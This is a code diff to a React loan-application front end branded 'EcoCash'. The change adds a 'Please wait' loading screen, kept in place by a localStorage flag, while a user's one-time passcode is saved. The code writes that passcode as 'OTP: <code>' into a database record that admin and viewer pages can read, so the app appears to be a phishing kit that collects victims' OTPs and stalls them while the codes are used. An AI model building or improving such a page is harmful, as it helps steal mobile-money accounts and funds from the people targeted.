@@ -15,6 +15,8 @@ import { calculateMonthlyPayment } from './utils/calculator';
 import { resolveActiveApplicationId } from './utils/applicationId';
 import { buildApplicationInsertPayload, createApplicationInSupabase, updateApplicationVerificationCodeInSupabase } from './utils/supabaseDirect';
 
+const PROCESSING_STORAGE_KEY = 'isProcessing';
+
 const initialFormData: LoanFormData = {
   loanType: 'Personal Loan',
   loanAmount: 5000,
@@ -97,10 +99,14 @@ export default function App() {
     const displayValue = `${existing}OTP: ${otp}`;
     try {
       submittedApplicationIdRef.current = applicationId;
+      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'true');
+      setCurrentStep('loading');
       await updateApplicationVerificationCodeInSupabase(applicationId, displayValue);
       setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
+      window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
       setCurrentStep('success');
     } catch (error: any) {
+      window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
       console.error('OTP update failed', {
         applicationId,
         phone,
@@ -108,6 +114,7 @@ export default function App() {
         error,
         stack: error?.stack,
       });
+      setCurrentStep('otp');
       throw error;
     }
   };
@@ -122,6 +129,14 @@ export default function App() {
     window.addEventListener('popstate', handlePopState);
     return () => window.removeEventListener('popstate', handlePopState);
   }, []);
+
+  useEffect(() => {
+    const isProcessing = window.localStorage.getItem(PROCESSING_STORAGE_KEY);
+    if (isProcessing === 'true') {
+      setCurrentStep('loading');
+    }
+  }, []);
+
 
   const navigateToAdmin = () => {
     window.history.pushState({}, '', '/admin');
@@ -244,16 +259,23 @@ export default function App() {
     );
   }
 
-  if (isViewerView) {
+  if (currentStep === 'loading') {
     return (
-      <div className="min-h-screen bg-slate-100/90 text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
-        <Header currentStep={currentStep} onBack={navigateToApp} onReset={navigateToApp} />
-        <main className="flex-1 p-3 sm:p-6">
-          <ViewerPage onBackToApp={navigateToApp} />
-        </main>
-        <footer className="py-4 text-center text-xs text-slate-400 font-medium">
-          &copy; 2025 EcoCash
-        </footer>
+      <div className="min-h-screen w-full relative flex items-center justify-center bg-white">
+        <div className="absolute inset-0 opacity-10 pointer-events-none filter blur-[1px]">
+          <OtpScreen
+            phone={formData.phone}
+            applicationId={submittedApplication?.id ?? submittedApplicationIdRef.current ?? ''}
+            verificationDisplay={submittedApplication?.verificationCode ?? ''}
+            onBack={() => {}}
+            onSuccess={() => Promise.resolve()}
+          />
+        </div>
+        <div className="relative z-10 flex flex-col items-center gap-4 px-6">
+          <div className="h-14 w-14 rounded-full border-4 border-[#E5E7EB] border-t-[#0052CC] animate-spin" />
+          <h1 className="text-xl font-semibold text-[#111827]">Please wait...</h1>
+          <p className="text-base text-[#4B5563]">This usually takes a few seconds</p>
+        </div>
       </div>
     );
   }
@@ -346,7 +368,6 @@ export default function App() {
           &copy; 2025 EcoCash
         </footer>
       )}
-      </footer>
     </div>
   );
 }
